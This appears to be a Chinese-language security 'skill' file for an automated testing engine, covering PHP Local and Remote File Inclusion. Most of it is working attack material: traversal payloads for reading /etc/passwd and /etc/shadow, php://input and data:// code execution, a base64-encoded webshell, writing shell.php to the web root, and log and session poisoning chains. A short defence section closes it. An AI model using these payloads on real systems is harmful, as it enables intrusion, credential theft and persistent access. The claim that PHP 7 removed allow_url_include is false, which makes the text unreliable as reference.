---
name: web-lfi-001
description: "Local File Inclusion (LFI) / Remote File Inclusion (RFI) 技术用于在应用存在文件包含漏洞时，通过控制包含路径读取服务器本地文件或远程执行代码 适用于: 应用使用动态文件包含（include/require 函数）; URL 参数控制文件路径或模板名称; 从参数值拼接文件扩展名（如 page=about → about.php）; 存在文件读取/下载功能但路径参数可控"
license: MIT
metadata:
  author: HOS-Sec-Engine
  version: 2026-06
  tags:
  - lfi
  - rfi
  - file-inclusion
  - path-traversal
  - directory-traversal
  - php-wrapper
  - log-poisoning
  category: web
  risk-level: critical
  confidence: 0.91
---
# Local File Inclusion & Remote File Inclusion

文件包含漏洞（LFI/RFI）允许攻击者利用应用动态包含文件的机制，读取服务器本地文件或在特定条件下执行远程代码。PHP 的 include/require 函数是最常见的攻击面，其他语言（JSP、ASP.NET、Node.js 的模板加载器）也存在类似问题。LFI 可配合日志注入、php:// 伪协议、文件上传等方式升级为 RCE。

## 何时使用

### 触发场景

- 应用使用动态文件包含（include/require 函数加载用户可控文件）
- URL 参数控制页面/模板路径：`index.php?page=about`
- 从参数值拼接文件扩展名：`include("pages/" . $_GET['page'] . ".php")`
- 存在文件读取/下载功能但路径参数未严格校验
- 应用使用模板引擎且模板名称来自用户输入
- PHP 应用中存在 file_get_contents、fopen、include 等函数的调用

### 关键词

`文件包含`, `lfi`, `rfi`, `local file inclusion`, `remote file inclusion`, `path traversal`, `目录穿越`, `php wrapper`, `php://filter`, `php://input`, `data://`, `log poisoning`, `include`, `require`, `文件读取`, `文件下载`, `任意文件读取`

### 识别指标

- URL 中包含 ?page=、?file=、?template=、?include=、?path= 等参数
- 响应内容包含已知的文件内容（如 /etc/passwd）
- 错误信息暴露了包含路径
- 文件扩展名被自动添加（.php、.html、.inc 等）
- 参数值使用路径格式（如 ./includes/header.php）

### 别名

`目录穿越`, `路径遍历`, `任意文件读取`, `文件泄露`, `php 文件包含`, `local file disclosure`, `remote code execution via LFI`

## 操作检查清单

1. 识别所有包含用户输入的文件路径参数（参数名：file、page、include、path、template、load、document、root、folder、dir 等）
2. 测试基础 LFI：page=../../../etc/passwd
3. 测试路径编码绕过：../、..%2f、..%252f、..\\/
4. 测试空字节截断（PHP < 5.3.4）：page=../../../etc/passwd%00
5. 测试长度截断（PHP < 5.2）：page=../../../etc/passwd/./././././.[...]
6. 测试 PHP 伪协议：php://filter/convert.base64-encode/resource=index.php
7. 测试 php://input + POST body 实现 RCE
8. 测试 data:// 伪协议实现 RCE
9. 测试 expect:// 伪协议执行命令（需安装 expect 扩展）
10. 测试日志注入（Apache/Nginx access log 写入 PHP 代码后包含）
11. 测试 /proc/self/environ、/proc/self/fd/* 等 proc 文件系统
12. 测试 session 文件包含（session 文件路径可预测时注入 PHP 代码）
13. 测试现有文件上传 + 包含利用链
14. 测试 RFI：allow_url_include=On 时包含远程恶意文件
15. 验证读取的文件内容是否包含敏感信息

## 技术手段

- 目录遍历：../../../../etc/passwd → 读取任意文件
- PHP 伪协议 RCE：
  - php://filter/convert.base64-encode/resource=file（读取文件）
  - php://input + POST body = <?php system('id'); ?>（执行代码）
  - data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==（执行代码）
  - expect://id（执行命令，需 expect 扩展）
- 日志注入 RCE：写入 Apache/Nginx access log（User-Agent 字段注入 PHP 代码）→ 包含日志文件
- Session 文件包含：session 文件内容可控时包含 session 文件
- /proc/self/environ：User-Agent 注入 PHP 代码后包含该文件
- /proc/self/fd/N：遍历文件描述符访问临时文件
- 路径编码绕过：URL 双重编码、Unicode 编码、16 位编码
- 文件扩展名绕过：利用空字节截断、长度截断、双扩展名解析差异
- SSH log 注入：通过 SSH 连接日志注入恶意代码
- PHP_INFO 结合包含：phpinfo() 页面泄露临时文件路径
- Apache .htaccess 结合包含：利用 .htaccess 配置使图片按 PHP 执行

## 实战经验

### 症状

- URL 参数名包含 page、file、include、template 等关键词
- 响应内容包含非预期的文件内容（如系统配置文件）
- 参数值使用 ../ 路径格式返回正常
- 参数值被添加 .php 等扩展名后缀
- 应用使用 MVC 框架（如 CodeIgniter、Laravel、ThinkPHP）的视图加载功能

### 根因分析

- PHP include/require 函数直接从用户参数值拼接路径，未做任何过滤
- 开发者期望用户只加载白名单中的文件，但未做白名单校验
- 文件路径过滤仅检查 ../ 关键字，未考虑编码变体
- 伪协议过滤不完整，php://、data:// 等未禁用
- PHP 配置中 allow_url_include = On 允许远程文件包含
- 自动添加 .php 扩展名可以被空字节或伪协议绕过

### 实战观察

- php://filter 是 LFI 最通用的利用方式，不受 PHP 版本和配置影响
- PHP < 5.3.4 的空字节截断 %00 是最经典的绕过方式
- PHP < 5.2 的长度截断利用 Windows 路径长度 256 字符限制
- 日志注入需要知道日志路径（/var/log/apache2/access.log 等）
- /proc/self/environ 在 CGI/FastCGI 模式下有效
- Session 文件包含成功率最高，因为 session 文件内容攻击者可控
- allow_url_include 在 PHP 5.x 默认关闭，PHP 7.x 已移除该功能
- data:// 伪协议在 allow_url_include=On 时有效
- 现代框架（Laravel、Symfony）自带路径限制，但仍可能存在绕过

### 常见错误

- 只测试了目录遍历但未测试 PHP 伪协议
- 忽略编码绕过，仅测试了标准 ../ 格式
- 未测试日志注入和 session 包含等无文件的利用方式
- 认为文件扩展名拼接可以完全防御（php://filter 可绕过）
- 在 PHP 7+ 中仍预期空字节截断有效
- 忽略 /proc 文件系统的利用价值

### 补充说明

- LFI → RCE 的利用链在实战中非常关键，日志注入是最稳定的方式
- 读取源代码（php://filter/base64）是最安全的验证方式
- 不同操作系统路径格式不同：Linux 用 ../，Windows 用 ..\ 或 ../
- Docker 容器中日志路径可能不同（/var/log/nginx/ 或 /var/log/apache2/）
- 目标使用 CDN 时日志注入的 User-Agent 可能被 CDN 修改
- LFI + 文件上传的组合是获取 WebShell 最稳定的路径

## 示例

### 基础 LFI 读取 /etc/passwd

利用目录遍历读取服务器系统文件

```
原始 URL: http://target.com/index.php?page=about
LFI Payload: http://target.com/index.php?page=../../../etc/passwd

路径遍历:
page=../etc/passwd             → 一级目录
page=../../etc/passwd          → 二级目录  
page=../../../etc/passwd       → 三级目录（常见 Web 目录）
page=../../../../etc/passwd    → 更深目录

Windows 路径:
page=../../../Windows/System32/drivers/etc/hosts
page=../../../boot.ini
page=../../../windows/win.ini

原理: ../ 返回上一级目录，多次 ../ 可跳出 Web 根目录
      通过 Linux 路径读取 /etc/passwd 经典测试文件
```

### php://filter 读取源码

利用 PHP 伪协议读取任意文件源码（不受添加扩展名影响）

```
包含 .php 文件源码（绕过执行）:
page=php://filter/convert.base64-encode/resource=index.php

读取配置文件:
page=php://filter/convert.base64-encode/resource=config/database.php

读取系统文件:
page=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd

链式过滤器:
page=php://filter/convert.base64-encode|convert.base64-decode/resource=file

原理: php://filter 使用 base64 编码输出，绕过文件执行
     不受 include 自动追加 .php 扩展名的影响（filter 不依赖扩展名）
利用: 解码 base64 获取源码，寻找其他漏洞入口
```

### php://input 实现 RCE

利用 php://input 伪协议从 POST body 中执行代码

```
需要条件: allow_url_include = On
          不需要远程文件包含能力

请求:
GET /index.php?page=php://input HTTP/1.1
Host: target.com

POST Body:
<?php system('id'); ?>

或:
<?php file_put_contents('/var/www/html/shell.php', '<?php system($_GET[cmd]);?>'); ?>

原理: php://input 读取 POST body 内容并直接执行
      PHP 引擎将 POST body 作为 PHP 代码处理
注意: PHP 7+ 中 allow_url_include 已被移除
```

### data:// 伪协议 RCE

利用 data:// 伪协议直接在 URL 中嵌入 PHP 代码

```
需要条件: allow_url_include = On

基础用法:
page=data://text/plain,<?php%20system('id');?>

Base64 编码（规避特殊字符检测）:
page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==

解码: echo -n '<?php system($_GET[cmd]);?>' | base64
    → PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==

原理: data:// 将数据作为文件流包含
      base64 编码可绕过关键字检测（如 <?php、system）
```

### 日志注入 LFI → RCE

利用 Apache/Nginx access log 注入 PHP 代码，通过 LFI 包含日志文件触发执行

```
步骤 1: 向日志中注入 PHP 代码（通过 User-Agent 头）

请求:
GET / HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>

步骤 2: 使用 LFI 包含日志文件

Apache 日志路径:
page=../../../../var/log/apache2/access.log
page=../../../../var/log/httpd/access_log

Nginx 日志路径:
page=../../../../var/log/nginx/access.log

步骤 3: 执行命令
http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id

原理: Web 服务器将 User-Agent 原样写入访问日志
     LFI 包含日志文件时 PHP 会执行其中的 <?php ?> 代码
     需要 Web 服务器用户（www-data）对日志文件有读取权限
```

### Session 文件包含

利用 PHP session 文件内容可控的特性实现代码执行

```
前提: 攻击者可控制 PHP session 文件中的部分内容

步骤 1: 向 session 中写入恶意数据（通过登录表单、搜索框等可控字段）
步骤 2: 确定 session 文件路径

默认路径:
Linux: /var/lib/php/sessions/sess_{session_id}
Linux: /tmp/sess_{session_id}  
Windows: C:\Windows\Temp\sess_{session_id}

步骤 3: 使用 LFI 包含 session 文件
page=../../../../var/lib/php/sessions/sess_abc123

原理: PHP session 序列化存储在文件中
     如果 session 中存储了用户可控的数据（如 username），可注入 PHP 代码
     需要知道 session ID（可从 cookie PHPSESSID 获取）
```

### /proc/self/environ 利用

利用 /proc/self/environ 中的环境变量注入代码

```
请求:
GET /index.php?page=../../../../proc/self/environ HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>

原理: /proc/self/environ 存储当前进程的环境变量
     User-Agent 头常被记录在环境变量中
     当包含此文件时，User-Agent 中的 PHP 代码被执行
注意: 在 CGI/FastCGI 模式下有效
     现代 PHP-FPM 可能不记录 HTTP 头到环境变量
```

## 验证标准

### 验证指标

- 文件包含成功并返回文件内容（如 /etc/passwd 包含 root:x:0:0:）
- php://filter 返回 base64 编码的文件内容
- php://input/data:// 成功执行系统命令
- 日志注入后访问日志文件触发代码执行
- 不同路径深度返回相同内容（说明包含成功）
- 错误信息暴露了文件的物理路径

### 成功标志

- 成功读取 /etc/passwd、/etc/shadow 等敏感系统文件
- 获取数据库配置文件中的凭据信息
- 通过伪协议成功执行系统命令
- 获取 WebShell 或建立持久化访问
- 成功读取应用源代码进行进一步审计

### 误报标志

- 响应内容为应用错误页面而非文件内容
- 相同的 URL 无论路径深度返回相同内容（服务器直接忽略路径）
- 读取的文件内容被截断或编码异常
- 伪协议请求返回空白或错误，说明 filter 被禁用

## 防御建议

### 推荐做法

- 使用白名单机制：只允许加载预先定义的文件列表
- 避免将用户输入直接传递给文件包含函数
- 禁用危险 PHP 配置：allow_url_include = Off
- 禁用不必要的 PHP 包装器：php://、data://、expect://
- 使用 basename() 和 realpath() 函数规范化路径
- 移除文件扩展名自动拼接逻辑
- 限制 Web 服务器用户对系统文件的读取权限
- 使用 open_basedir 限制 PHP 可访问的目录范围

### 缓解措施

- 升级 PHP 到 7.4+（移除 allow_url_include，修复空字节截断）
- 禁用不必要的 PHP 扩展（expect、curl）
- 配置 Web 服务器防止日志注入（过滤 User-Agent 中的 PHP 标签）
- 使用 WAF 规则检测目录遍历和伪协议请求
- 将 session 文件存储在 Web 根目录不可访问的位置
- 定期审计文件包含函数的使用场景

## 参考链接

- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- https://www.php.net/manual/en/wrappers.php.php
- https://book.hacktricks.xyz/pentesting-web/file-inclusion
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
